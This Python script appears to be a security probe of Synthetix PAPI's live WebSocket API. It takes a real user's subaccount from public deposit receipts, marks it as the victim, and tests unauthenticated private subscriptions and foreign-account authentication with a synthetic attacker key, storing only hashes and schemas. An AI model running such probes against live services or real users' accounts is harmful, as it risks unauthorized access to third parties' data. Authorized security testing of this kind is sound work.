#!/usr/bin/env python3
"""Redacted, read-only WebSocket authorization probe for Synthetix PAPI.

The probe derives an owned subaccount from public deposit receipts, then uses
only a deterministic synthetic attacker key. It checks unauthenticated private
subscriptions, foreign-account authentication, and a nonexistent-account
negative control. No trading or state-changing method is sent. Any server or
push payload is reduced to status/schema/hash; raw account data is not retained.
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import pathlib
import re
import time
import urllib.error
import urllib.request
from typing import Any

from eth_account import Account
from eth_account.messages import encode_typed_data
from eth_utils import to_checksum_address
import websockets

OUT = pathlib.Path("ws_auth_boundary")
OUT.mkdir(parents=True, exist_ok=True)

RPC_URLS = (
    "https://ethereum-rpc.publicnode.com",
    "https://eth.llamarpc.com",
    "https://rpc.mevblocker.io",
    "https://eth.drpc.org",
)
PAPI_INFO = "https://papi.synthetix.io/v1/info"
WS_TRADE = "wss://papi.synthetix.io/v1/ws/trade"
WS_INFO = "wss://papi.synthetix.io/v1/ws/info"
DEPOSIT_PROXY = "0xD62595c3c23B690BAEE0935e107A209Cb1Dbd37B"
ASSET_DEPOSITED_TOPIC = "0x8d9f8eed9603fe0e069574aaf008e644885b52d54ba86f026277ac9db1c2d08a"
DEPOSIT_TX_HASHES = (
    "0xb8099b559a99ef2e5122c7b37e2288cd21c90ab4a9cd282ebd556fac21c8618c",
    "0xff4a76000616a7bd6e7eec8dc8dd5ddc3aad54d61ae14e096b22721d1d4993fa",
    "0xff49e1668459cf9d6740fa406bb6e1714495451614bf7a0cbba287fd012d0406",
    "0x2bcf6ce3cd19759da83c531db0c37756af79371e4acd0c5e94e870c0485cd0dc",
    "0x37e4ed3427007aa6c4f2d3297fd12b42b854ae55fae5b1203fac5406d9b170ec",
    "0x3768526db1bd1a128785882ad010ba415508d51ff11b603872fc7d45789ccfc8",
    "0x0c9bf25d6b94eec665034bccfe2e72132084f6e540eae6bdfd3f6f4db25d3f30",
)
ATTACKER_KEY = "0x" + "66" * 32
ATTACKER = Account.from_key(ATTACKER_KEY)
SYNTHETIC_ID = 999_999_999_999_999_989
UA = "Mozilla/5.0 (compatible; authorized-read-only-security-review/1.0)"
MAX_BODY = 2 * 1024 * 1024
DOMAIN_FIELDS = [
    {"name": "name", "type": "string"},
    {"name": "version", "type": "string"},
    {"name": "chainId", "type": "uint256"},
    {"name": "verifyingContract", "type": "address"},
]
DOMAIN = {
    "name": "Synthetix",
    "version": "1",
    "chainId": 1,
    "verifyingContract": "0x0000000000000000000000000000000000000000",
}
AUTH_TYPES = {
    "EIP712Domain": DOMAIN_FIELDS,
    "AuthMessage": [
        {"name": "subAccountId", "type": "uint256"},
        {"name": "timestamp", "type": "uint256"},
        {"name": "action", "type": "string"},
    ],
}

DIAG: dict[str, Any] = {
    "stage": "initializing",
    "rpcCalls": 0,
    "receiptsChecked": 0,
    "depositEventsFound": 0,
    "papiInfoRequests": [],
}


def digest(value: str | bytes) -> str:
    if isinstance(value, str):
        value = value.encode()
    return hashlib.sha256(value).hexdigest()


def redact(value: Any) -> str | None:
    if value is None:
        return None
    text = str(value)
    text = re.sub(r"0x[a-fA-F0-9]{40}", "<address>", text)
    text = re.sub(r"0x[a-fA-F0-9]{64,}", "<hex>", text)
    text = re.sub(r"\b\d{6,}\b", "<number>", text)
    return text[:300]


def post_json(url: str, payload: dict[str, Any], timeout: int = 45) -> tuple[int, bytes]:
    request = urllib.request.Request(
        url,
        data=json.dumps(payload, separators=(",", ":")).encode(),
        headers={"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            body = response.read(MAX_BODY + 1)
            if len(body) > MAX_BODY:
                raise ValueError("response too large")
            return response.status, body
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read(MAX_BODY + 1)


def rpc(method: str, params: list[Any]) -> Any:
    DIAG["rpcCalls"] += 1
    payload = {"jsonrpc": "2.0", "id": 1, "method": method, "params": params}
    errors: list[str] = []
    for url in RPC_URLS:
        try:
            status, body = post_json(url, payload)
            parsed = json.loads(body)
            if status >= 400 or "error" in parsed:
                error = parsed.get("error")
                code = error.get("code") if isinstance(error, dict) else None
                errors.append(f"status={status},code={code}")
                continue
            return parsed["result"]
        except Exception as exc:  # noqa: BLE001
            errors.append(type(exc).__name__)
    raise RuntimeError("RPC failed: " + " | ".join(errors))


def schema(value: Any, depth: int = 0) -> Any:
    if depth >= 4:
        return type(value).__name__
    if isinstance(value, dict):
        return {str(key): schema(item, depth + 1) for key, item in sorted(value.items())}
    if isinstance(value, list):
        return {
            "type": "list",
            "count": len(value),
            "sample": schema(value[0], depth + 1) if value else None,
        }
    return type(value).__name__


def topic_address(value: str) -> str:
    return to_checksum_address("0x" + value[-40:])


def account_ids(wallet: str) -> dict[str, list[str]]:
    status, body = post_json(
        PAPI_INFO,
        {"params": {"action": "getSubAccountIds", "walletAddress": wallet, "includeDelegations": True}},
    )
    try:
        parsed = json.loads(body)
    except Exception:
        parsed = None
    response = parsed.get("response") if isinstance(parsed, dict) else None
    result = {"owned": [], "delegated": [], "managed": []}
    if status == 200 and isinstance(parsed, dict) and parsed.get("status") == "ok":
        if isinstance(response, list):
            result["owned"] = [str(value) for value in response]
        elif isinstance(response, dict):
            result["owned"] = [str(value) for value in response.get("subAccountIds", []) or []]
            result["delegated"] = [str(value) for value in response.get("delegatedSubAccountIds", []) or []]
            result["managed"] = [str(value) for value in response.get("managedSubAccountIds", []) or []]
    error = parsed.get("error") if isinstance(parsed, dict) else None
    error_code = error.get("code") if isinstance(error, dict) else None
    error_message = error.get("message") if isinstance(error, dict) else error
    DIAG["papiInfoRequests"].append(
        {
            "httpStatus": status,
            "apiStatus": parsed.get("status") if isinstance(parsed, dict) else None,
            "errorCode": error_code,
            "errorMessageRedacted": redact(error_message),
            "responseSchema": schema(response),
            "ownedCount": len(result["owned"]),
            "delegatedCount": len(result["delegated"]),
            "managedCount": len(result["managed"]),
            "bodySha256": digest(body),
        }
    )
    return result


def discover_target() -> tuple[str, str]:
    DIAG["stage"] = "discovering_public_owned_subaccount"
    for tx_hash in DEPOSIT_TX_HASHES:
        DIAG["receiptsChecked"] += 1
        receipt = rpc("eth_getTransactionReceipt", [tx_hash])
        if not isinstance(receipt, dict):
            continue
        for log in receipt.get("logs", []):
            topics = log.get("topics", [])
            if (
                str(log.get("address", "")).lower() == DEPOSIT_PROXY.lower()
                and len(topics) >= 4
                and str(topics[0]).lower() == ASSET_DEPOSITED_TOPIC.lower()
            ):
                DIAG["depositEventsFound"] += 1
                beneficiary = topic_address(topics[2])
                ids = account_ids(beneficiary)
                owned = [value for value in ids["owned"] if value.isdigit() and int(value) > 0]
                if owned:
                    return beneficiary, owned[0]
                time.sleep(0.3)
    raise RuntimeError("No public deposit beneficiary had a discoverable owned account")


def sign_auth(subaccount_id: int, timestamp: int) -> tuple[dict[str, Any], str]:
    message = {"subAccountId": subaccount_id, "timestamp": timestamp, "action": "websocket_auth"}
    signed = ATTACKER.sign_message(
        encode_typed_data(
            full_message={
                "types": AUTH_TYPES,
                "primaryType": "AuthMessage",
                "domain": DOMAIN,
                "message": message,
            }
        )
    )
    signature = "0x" + format(signed.r, "064x") + format(signed.s, "064x") + format(signed.v, "02x")
    payload = {
        "types": AUTH_TYPES,
        "primaryType": "AuthMessage",
        "domain": DOMAIN,
        "message": {
            "subAccountId": hex(subaccount_id),
            "timestamp": hex(timestamp),
            "action": "websocket_auth",
        },
    }
    return payload, signature


def status_values(value: Any, depth: int = 0) -> list[Any]:
    if depth > 4:
        return []
    values: list[Any] = []
    if isinstance(value, dict):
        for key, item in value.items():
            if str(key).lower() in {"status", "code", "authenticated", "subscribed"}:
                values.append(item)
            values.extend(status_values(item, depth + 1))
    elif isinstance(value, list):
        for item in value[:10]:
            values.extend(status_values(item, depth + 1))
    return values


def summarize_message(raw: str) -> dict[str, Any]:
    try:
        parsed = json.loads(raw)
    except Exception:
        return {"json": False, "bodyBytes": len(raw.encode()), "bodySha256": digest(raw)}
    error = parsed.get("error") if isinstance(parsed, dict) else None
    error_code = error.get("code") if isinstance(error, dict) else None
    error_message = error.get("message") if isinstance(error, dict) else error
    return {
        "json": True,
        "topLevelKeys": sorted(parsed.keys()) if isinstance(parsed, dict) else None,
        "requestIdPresent": bool(parsed.get("id") or parsed.get("requestId")) if isinstance(parsed, dict) else False,
        "method": parsed.get("method") if isinstance(parsed, dict) else None,
        "statusValues": status_values(parsed),
        "errorCode": error_code,
        "errorMessageRedacted": redact(error_message),
        "messageSchema": schema(parsed),
        "bodySha256": digest(raw),
        "bodyBytes": len(raw.encode()),
    }


def accepted(messages: list[dict[str, Any]]) -> bool:
    accepted_values = {True, 200, "200", "ok", "success", "authenticated", "subscribed"}
    for message in messages:
        for value in message.get("statusValues", []):
            if value in accepted_values or (isinstance(value, str) and value.lower() in accepted_values):
                return True
    return False


async def receive_summaries(ws: Any, seconds: float = 4.0, limit: int = 8) -> list[dict[str, Any]]:
    messages: list[dict[str, Any]] = []
    deadline = asyncio.get_running_loop().time() + seconds
    while len(messages) < limit:
        remaining = deadline - asyncio.get_running_loop().time()
        if remaining <= 0:
            break
        try:
            raw = await asyncio.wait_for(ws.recv(), timeout=remaining)
        except asyncio.TimeoutError:
            break
        messages.append(summarize_message(raw))
    return messages


async def unauthenticated_subscribe(url: str, victim_id: str, name: str) -> dict[str, Any]:
    try:
        async with websockets.connect(url, additional_headers={"User-Agent": UA}, ping_interval=None) as ws:
            await ws.send(
                json.dumps(
                    {
                        "id": "1",
                        "method": "subscribe",
                        "params": {"type": "subAccountUpdates", "sub_account_id": victim_id},
                    },
                    separators=(",", ":"),
                )
            )
            messages = await receive_summaries(ws)
            return {"name": name, "connected": True, "accepted": accepted(messages), "messages": messages}
    except Exception as exc:  # noqa: BLE001
        return {
            "name": name,
            "connected": False,
            "errorType": type(exc).__name__,
            "errorRedacted": redact(exc),
            "errorSha256": digest(str(exc)),
        }


async def authenticate_then_subscribe(subaccount_id: int, name: str) -> dict[str, Any]:
    timestamp = int(time.time() * 1000)
    payload, signature = sign_auth(subaccount_id, timestamp)
    try:
        async with websockets.connect(WS_TRADE, additional_headers={"User-Agent": UA}, ping_interval=None) as ws:
            await ws.send(
                json.dumps(
                    {
                        "id": "1",
                        "method": "auth",
                        "params": {"message": json.dumps(payload, separators=(",", ":")), "signature": signature},
                    },
                    separators=(",", ":"),
                )
            )
            auth_messages = await receive_summaries(ws, seconds=3.0, limit=4)
            await ws.send(
                json.dumps(
                    {
                        "id": "2",
                        "method": "subscribe",
                        "params": {"type": "subAccountUpdates", "sub_account_id": str(subaccount_id)},
                    },
                    separators=(",", ":"),
                )
            )
            subscription_messages = await receive_summaries(ws, seconds=4.0, limit=6)
            return {
                "name": name,
                "connected": True,
                "authAccepted": accepted(auth_messages),
                "subscriptionAccepted": accepted(subscription_messages),
                "authMessages": auth_messages,
                "subscriptionMessages": subscription_messages,
            }
    except Exception as exc:  # noqa: BLE001
        return {
            "name": name,
            "connected": False,
            "errorType": type(exc).__name__,
            "errorRedacted": redact(exc),
            "errorSha256": digest(str(exc)),
        }


async def run_probe() -> dict[str, Any]:
    beneficiary, victim_id = discover_target()
    DIAG["stage"] = "testing_websocket_authorization"
    tests = [
        await unauthenticated_subscribe(WS_TRADE, victim_id, "trade_endpoint_unauth_private_subscribe"),
        await unauthenticated_subscribe(WS_INFO, victim_id, "info_endpoint_private_channel_subscribe"),
        await authenticate_then_subscribe(int(victim_id), "foreign_account_auth_and_subscribe"),
        await authenticate_then_subscribe(SYNTHETIC_ID, "nonexistent_account_auth_control"),
    ]
    DIAG["stage"] = "completed"
    unexpected = False
    for test in tests:
        if test["name"].startswith("trade_endpoint_unauth") and test.get("accepted"):
            unexpected = True
        if test["name"].startswith("info_endpoint_private") and test.get("accepted"):
            unexpected = True
        if test["name"].startswith("foreign_account") and (
            test.get("authAccepted") or test.get("subscriptionAccepted")
        ):
            unexpected = True
    return {
        "safety": "Read-only auth/subscribe checks only; no trade or state-changing method; no raw victim data retained.",
        "attackerAddress": ATTACKER.address,
        "victimBeneficiarySha256": digest(beneficiary.lower()),
        "victimSubaccountIdSha256": digest(victim_id),
        "tests": tests,
        "unexpectedAcceptance": unexpected,
        "diagnostics": DIAG,
    }


async def main() -> None:
    try:
        summary = await run_probe()
    except BaseException as exc:  # noqa: BLE001
        summary = {
            "safety": "No trade or state-changing method was sent; no raw victim data retained.",
            "probeCompleted": False,
            "unexpectedAcceptance": False,
            "failureType": type(exc).__name__,
            "failureRedacted": redact(exc),
            "failureSha256": digest(str(exc)),
            "diagnostics": DIAG,
        }
    (OUT / "summary.json").write_text(json.dumps(summary, indent=2), encoding="utf-8")
    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    asyncio.run(main())
